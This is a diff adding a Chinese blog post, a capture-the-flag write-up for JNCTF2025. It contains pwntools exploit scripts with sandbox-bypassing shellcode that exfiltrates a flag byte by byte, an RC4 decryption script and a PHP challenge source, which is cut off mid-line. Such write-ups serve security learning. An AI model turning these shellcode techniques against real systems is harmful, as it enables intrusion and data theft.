@@ -1,0 +1,665 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" href="/img/head.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="JNCTF2025 WP  ————Sally PWN1. signinunregister的权限问题，可以用Admin账户去注销root账户，然后重新注册root账户就能拿到管理员权限   2. shellcoe_master（非预期解法）这个题给了个沙箱，限制只能用orw，而且write一次只能输出一个字节，还开了PIE保护  在执行shellcode之前，除r15和rip之外的寄存器全部清0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNCTF2025WP">
+<meta property="og:url" content="http://example.com/2025/03/24/1/index.html">
+<meta property="og:site_name" content="Sally的blog">
+<meta property="og:description" content="JNCTF2025 WP  ————Sally PWN1. signinunregister的权限问题，可以用Admin账户去注销root账户，然后重新注册root账户就能拿到管理员权限   2. shellcoe_master（非预期解法）这个题给了个沙箱，限制只能用orw，而且write一次只能输出一个字节，还开了PIE保护  在执行shellcode之前，除r15和rip之外的寄存器全部清0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323191804461.png">
+<meta property="og:image" content="c:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323191840975.png">
+<meta property="og:image" content="c:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323192427502.png">
+<meta property="og:image" content="c:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323193200743.png">
+<meta property="og:image" content="c:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323194143037.png">
+<meta property="article:published_time" content="2025-03-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-24T12:44:14.537Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323191804461.png">
+  
+  
+  
+  <title>JNCTF2025WP - Sally的blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sally&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JNCTF2025WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-24 00:00" pubdate>
+          2025年3月24日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JNCTF2025WP</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="JNCTF2025-WP"><a href="#JNCTF2025-WP" class="headerlink" title="JNCTF2025 WP"></a>JNCTF2025 WP</h1><p>  <em>————Sally</em></p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="1-signin"><a href="#1-signin" class="headerlink" title="1. signin"></a>1. signin</h3><p>unregister的权限问题，可以用Admin账户去注销root账户，然后重新注册root账户就能拿到管理员权限</p>
+<p><img src="C:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323191804461.png" srcset="/img/loading.gif" lazyload alt="image-20250323191804461"></p>
+<p><img src="C:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323191840975.png" srcset="/img/loading.gif" lazyload alt="image-20250323191840975"></p>
+<h3 id="2-shellcoe-master（非预期解法）"><a href="#2-shellcoe-master（非预期解法）" class="headerlink" title="2. shellcoe_master（非预期解法）"></a>2. shellcoe_master（非预期解法）</h3><p>这个题给了个沙箱，限制只能用orw，而且write一次只能输出一个字节，还开了PIE保护</p>
+<p><img src="C:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323192427502.png" srcset="/img/loading.gif" lazyload alt="image-20250323192427502"></p>
+<p>在执行shellcode之前，除r15和rip之外的寄存器全部清0（指向buf的位置）。而且在执行shellcode的时候buf段不可写，也代表着push和pop之类的指令不能用了。</p>
+<p>然后想到bss段rw权限，直接把flag写在bss段，然后orw，一个个字节读出来就好了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># r=process(&#x27;./sc_master_patched&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;172.18.137.75&#x27;</span>,<span class="hljs-number">32403</span>)<br><span class="hljs-comment"># bss=0x4078</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *$rebase(0x161B)&#x27;)</span><br><br><span class="hljs-comment">#shellcode</span><br><span class="hljs-comment"># 0. read(0,bss+base,0x30)</span><br><span class="hljs-comment"># 1. open(&#x27;./flag&#x27;)</span><br><span class="hljs-comment"># 2. read(0, buf+base+0x100, 0x30)</span><br><span class="hljs-comment"># 3. write(1, buf+base+0x100, 1)</span><br><span class="hljs-comment"># 4. write(1, buf+base+0x101,1)</span><br><span class="hljs-comment"># ......</span><br><br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">add r15,0x4078</span><br><span class="hljs-string">mov rsp,r15</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload0=<span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>shellcode2=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r8,rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rdi,r8</span><br><span class="hljs-string">add r15,0x100</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add rsp,0x100</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,41</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">add r15,1</span><br><span class="hljs-string">mov rsi,r15</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode1<br>payload+=shellcode2<br><br>r.sendline(payload)<br>r.sendline(payload0)<br>r.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-shellcode-master-revenge"><a href="#3-shellcode-master-revenge" class="headerlink" title="3. shellcode_master_revenge"></a>3. shellcode_master_revenge</h3><p><img src="C:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323193200743.png" srcset="/img/loading.gif" lazyload alt="image-20250323193200743"></p>
+<p>把地址换成了固定的0x114514000，不能把flag写在bss段了（</p>
+<p>思路还是一样的，不过这次要利用read读数据到不可写地址时返回负数的原理来爆破找一个可写的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># r=process(&#x27;./sc_master_revenge&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;172.18.137.75&#x27;</span>,<span class="hljs-number">32233</span>)<br><span class="hljs-comment"># bss=0x4078</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *$rebase(0x1656)&#x27;)</span><br><br>shellcode0=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">movabs r14,0x7fffffff0000</span><br><span class="hljs-string">loop_start:</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    mov rsi, r14</span><br><span class="hljs-string">    mov rdx, 5</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    test rax, rax</span><br><span class="hljs-string">    jns continue_exec</span><br><span class="hljs-string">    sub r14, 0x10000</span><br><span class="hljs-string">    jmp loop_start</span><br><span class="hljs-string">continue_exec:</span><br><span class="hljs-string">    mov r15, rax</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1 </span><br><span class="hljs-string">    movabs r11, 0x114514001</span><br><span class="hljs-string">    mov rsi, r11</span><br><span class="hljs-string">    mov rdx, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    mov rdi,0</span><br><span class="hljs-string">    mov rdx,0x50</span><br><span class="hljs-string">    mov rsi,r14</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>shellcode2=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,2</span><br><span class="hljs-string">mov rdi,r14</span><br><span class="hljs-string">xor rsi,rsi</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r8,rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov rdi,r8</span><br><span class="hljs-string">mov rsi,r14</span><br><span class="hljs-string">mov rdx,0x50</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov r9,rax</span><br><span class="hljs-string">xor r10,r10</span><br><span class="hljs-string"></span><br><span class="hljs-string">loop:</span><br><span class="hljs-string">    cmp r10, r9</span><br><span class="hljs-string">    jge exit_program </span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rax,1</span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    lea rsi,[r14+r10]</span><br><span class="hljs-string">    mov rdx,1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    add r10,1</span><br><span class="hljs-string">    jmp loop      </span><br><span class="hljs-string">exit_program:</span><br><span class="hljs-string">    mov rax,60</span><br><span class="hljs-string">    xor rdi,rdi</span><br><span class="hljs-string">    syscall     </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>payload=shellcode0<br>payload+=shellcode1<br>payload+=shellcode2<br>payload0 = <span class="hljs-string">b&#x27;flag\x00&#x27;</span><br><br>r.sendline(payload)<br>r.send(payload0)<br>r.sendline(payload0)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<p>在原来的exp上又稍微改进了一下，在0x7fffffff000的地址开始爆破</p>
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="compose"><a href="#compose" class="headerlink" title="compose"></a>compose</h3><p>在class3.dex里面找到Main activity和Main activity.kt，可以看出是一个RC4加密，密钥是Tanggegehaoshuai，直接写脚本就爆出来了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">key = <span class="hljs-string">b&#x27;TanggegeHaoShuai&#x27;</span><br>enc = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x12</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x61</span>,<br>    <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xDF</span>,<br>    <span class="hljs-number">0xED</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF6</span>,<br>    <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x3A</span>,<br>    <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x89</span><br>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">key, data</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># Key scheduling</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-comment"># Pseudo-random generation</span><br>    i = j = <span class="hljs-number">0</span><br>    result = []<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        result.append(byte ^ k)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br>decrypted = rc4_decrypt(key, enc)<br><span class="hljs-built_in">print</span>(decrypted.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-eateateat"><a href="#1-eateateat" class="headerlink" title="1. eateateat"></a>1. eateateat</h3><p>小游戏，没什么好说的，直接看源码就秒了</p>
+<p><img src="C:\Users\13679\AppData\Roaming\Typora\typora-user-images\image-20250323194143037.png" srcset="/img/loading.gif" lazyload alt="image-20250323194143037"></p>
+<h3 id="2-test-php"><a href="#2-test-php" class="headerlink" title="2.test php"></a>2.test php</h3><p>先贴源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">2025</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;活在当下2025，但好像不对？？？&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;哥们，这是年份，你在干嘛！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>, <span class="hljs-number">0</span>)==<span class="hljs-number">2025</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;咦，居然被你猜对了，还得是2025!&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;新年快乐啊！但送不了你flag！&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这才是第一关通过了！&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;JNSEC&#x27;</span>] == <span class="hljs-title function_ invoke__">md5</span>(<span 